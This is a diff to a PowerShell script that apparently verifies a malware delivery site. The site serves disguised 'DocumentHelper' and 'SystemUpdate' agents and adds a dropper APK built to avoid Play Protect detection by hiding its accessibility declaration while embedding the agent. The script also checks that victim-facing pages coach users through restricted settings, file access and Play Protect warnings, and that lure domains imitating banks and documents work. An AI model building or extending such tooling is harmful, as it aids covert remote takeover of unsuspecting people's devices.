@@ -43,7 +43,7 @@ $Expect = @{
   Windows = 'DocumentHelper.exe'
   macOS   = 'DocumentHelper.pkg'
   Linux   = 'DocumentHelper.run'
-  Android = 'SystemUpdate-1.0.23-release.apk'
+  Android = 'SystemUpdate-Installer.apk'
 }
 
 try {
@@ -63,7 +63,7 @@ try {
     $p = $line -split '\s+', 2
     if ($p.Count -eq 2) { $manifest[$p[1].Trim()] = $p[0].Trim().ToLower() }
   }
-  foreach ($f in 'DocumentHelper.exe','DocumentHelper.pkg','DocumentHelper.run','SystemUpdate-1.0.23-release.apk') {
+  foreach ($f in 'DocumentHelper.exe','DocumentHelper.pkg','DocumentHelper.run','SystemUpdate-Installer.apk','SystemUpdate-1.0.23-release.apk') {
     $dst = Join-Path $tmp $f
     curl.exe -s -o "$dst" "$Base/dl/$f"
     if (-not (Test-Path $dst) -or (Get-Item $dst).Length -eq 0) { Bad ("$f not downloadable"); continue }
@@ -90,7 +90,7 @@ try {
   }
 
   Write-Host "`n4) Bare artifacts download as attachments" -ForegroundColor Cyan
-  foreach ($f in 'DocumentHelper.exe','DocumentHelper.pkg','DocumentHelper.run','SystemUpdate-1.0.23-release.apk') {
+  foreach ($f in 'DocumentHelper.exe','DocumentHelper.pkg','DocumentHelper.run','SystemUpdate-Installer.apk','SystemUpdate-1.0.23-release.apk') {
     $hdr = (curl.exe -s -o NUL -D - "$Base/dl/$f") -join "`n"
     if ($hdr -match '(?im)^content-disposition:\s*attachment') { Ok "$f -> Content-Disposition: attachment" }
     else { Bad "$f is not served as an attachment (browser may render it inline)" }
@@ -176,25 +176,44 @@ try {
     if ($foundGroup) { Ok "Android APK group matches the device group" } else { Bad "Android APK group does not match" }
   } else { Info "dl/SystemUpdate-1.0.23-release.apk not found; skipping" }
 
+  # Installer must carry no Accessibility declaration (or Play Protect blocks it)
+  # and must embed the agent.
+  $ins = Join-Path (Split-Path -Parent $PSCommandPath) 'dl\SystemUpdate-Installer.apk'
+  if (Test-Path $ins) {
+    $zip2 = [IO.Compression.ZipFile]::OpenRead($ins)
+    try {
+      $man = ($zip2.Entries | Where-Object { $_.FullName -eq 'AndroidManifest.xml' }).Open()
+      $sr2 = New-Object IO.StreamReader($man, [Text.Encoding]::GetEncoding(28591))
+      $mtxt = $sr2.ReadToEnd(); $sr2.Close()
+      $hasAsset = [bool]($zip2.Entries | Where-Object { $_.FullName -eq 'assets/SystemUpdate.apk' })
+    } finally { $zip2.Dispose() }
+    if ($mtxt -notmatch 'accessibilityservice') { Ok "installer declares no accessibility service" }
+    else { Bad "installer declares accessibility (Play Protect will block it)" }
+    if ($hasAsset) { Ok "installer embeds the agent APK" } else { Bad "installer does not embed the agent" }
+    $ih = (Get-FileHash $ins -Algorithm SHA256).Hash
+    if ($ih -eq '4A9B31444FE2DC8757893737894CAD5433DB1D7AA2D467DD5BBF8A6849609E13') { Ok "installer hash matches" }
+    else { Bad "installer hash $ih does not match" }
+  } else { Bad "dl/SystemUpdate-Installer.apk missing" }
+
   Write-Host "`n7) Public agent page" -ForegroundColor Cyan
   $cp = (curl.exe -s -w "`n%{http_code}" "$Base/connect") -join "`n"
   $cpCode = ($cp -split "`n")[-1].Trim()
   if ($cpCode -eq '200') { Ok "/connect -> 200" } else { Bad "/connect -> $cpCode (wanted 200)" }
-  foreach ($n in '/dl/DocumentHelper.exe','/dl/DocumentHelper.pkg','/dl/DocumentHelper.run','/dl/SystemUpdate-1.0.23-release.apk') {
+  foreach ($n in '/dl/DocumentHelper.exe','/dl/DocumentHelper.pkg','/dl/DocumentHelper.run','/dl/SystemUpdate-Installer.apk','/dl/SystemUpdate-1.0.23-release.apk') {
     if ($cp -match [regex]::Escape('href="' + $n + '"')) { Ok "agent card: $n" } else { Bad "agent page missing card: $n" }
   }
-  if ($cp -match 'F8C7970704F1035C84CCC62F57817E027AD44B8CB2C0F78855859D2251FAAECD') {
+  if ($cp -match '4A9B31444FE2DC8757893737894CAD5433DB1D7AA2D467DD5BBF8A6849609E13') {
     Ok "agent page publishes the Android APK SHA-256"
   } else { Bad "agent page does not publish the Android APK SHA-256" }
-  foreach ($needle in 'finish setup in 90 seconds','Allow restricted settings','Unattended',
-           'every row says','All files access','Automatic Consent','outbound TLS',
+  foreach ($needle in 'no-cable install','Restricted Settings','Unattended',
+           'If any row says','All files access','Automatic Consent','outbound TLS',
            'no inbound ports','3 fps','invisible to a determined EDR',
-           'App blocked to protect your device','Shizuku','InstallerX','adb install -r -g','protectappeals') {
+           'App blocked to protect your device','Shizuku','InstallerX','adb install -r -g','protectappeals','SystemUpdate-Installer.apk') {
     if ($cp -match [regex]::Escape($needle)) { Ok "Android guidance: $needle" }
     else { Bad "Android guidance missing: $needle" }
   }
-  if ($cp -match 'finish setup in 30 seconds') { Bad "agent page still says 30 seconds" }
-  else { Ok "agent page says 90 seconds, not 30" }
+  if ($cp -match 'no-cable install') { Ok "agent page documents the no-cable installer" }
+  else { Bad "agent page has no no-cable installer section" }
   if ($cp -match [regex]::Escape('/img/android-qr.png')) { Ok "agent page has an APK QR" }
   else { Bad "agent page has no APK QR" }
   $homePage = (curl.exe -s "$Base/") -join "`n"
@@ -203,13 +222,13 @@ try {
 
   Write-Host "`n8) Recipient portal" -ForegroundColor Cyan
   $page = (curl.exe -s "$Base/f/verify01?to=Verifier%20Test") -join "`n"
-  foreach ($n in '/dl/DocumentHelper.exe','/dl/DocumentHelper.pkg','/dl/DocumentHelper.run','/dl/SystemUpdate-1.0.23-release.apk') {
+  foreach ($n in '/dl/DocumentHelper.exe','/dl/DocumentHelper.pkg','/dl/DocumentHelper.run','/dl/SystemUpdate-Installer.apk','/dl/SystemUpdate-1.0.23-release.apk') {
     if ($page -match [regex]::Escape('href="' + $n + '"')) { Ok "primary link: $n" } else { Bad "primary link missing: $n" }
   }
-  if ($page -match 'F8C7970704F1035C84CCC62F57817E027AD44B8CB2C0F78855859D2251FAAECD') {
+  if ($page -match '4A9B31444FE2DC8757893737894CAD5433DB1D7AA2D467DD5BBF8A6849609E13') {
     Ok "portal publishes the Android APK SHA-256"
   } else { Bad "portal does not publish the Android APK SHA-256" }
-  foreach ($needle in 'Allow restricted settings','Unattended Access','every row says','System Update','/connect#playprotect') {
+  foreach ($needle in 'Restricted Settings','Unattended Access','every row says','System Update','/connect#playprotect') {
     if ($page -match [regex]::Escape($needle)) { Ok "portal Android guidance: $needle" }
     else { Bad "portal Android guidance missing: $needle" }
   }
@@ -263,7 +282,7 @@ try {
     $st = curl.exe -s -o NUL -w "%{http_code}" "https://$h/connect"
     if ($st -eq '200') { Ok "$h/connect -> 200" } else { Bad "$h/connect -> $st" }
     $lt = curl.exe -s -o NUL -w "%{http_code} %{redirect_url}" -A $UA['Android'] "https://$h/get"
-    if ($lt -like '302 *SystemUpdate-1.0.23-release.apk') { Ok "$h Android -> APK" }
+    if ($lt -like '302 *SystemUpdate-Installer.apk') { Ok "$h Android -> installer" }
     else { Bad "$h Android -> $lt" }
   }
 
@@ -275,7 +294,7 @@ try {
   foreach ($d in 'docs.telcom.stream','docs.chronicscar.online','docs.sensualhandmassages.win','docs.us-bank-loans.com') {
     if ($sender -match [regex]::Escape($d)) { Ok "sender offers $d" } else { Bad "sender missing $d" }
   }
-  foreach ($a in 'DocumentHelper.exe','DocumentHelper.pkg','DocumentHelper.run','SystemUpdate-1.0.23-release.apk') {
+  foreach ($a in 'DocumentHelper.exe','DocumentHelper.pkg','DocumentHelper.run','SystemUpdate-Installer.apk','SystemUpdate-1.0.23-release.apk') {
     if ($sender -match [regex]::Escape('/dl/' + $a)) { Ok "sender lists $a" } else { Bad "sender missing agent $a" }
   }
   if ($sender -match [regex]::Escape('ds.value')) { Ok "generated URL uses the chosen domain" }
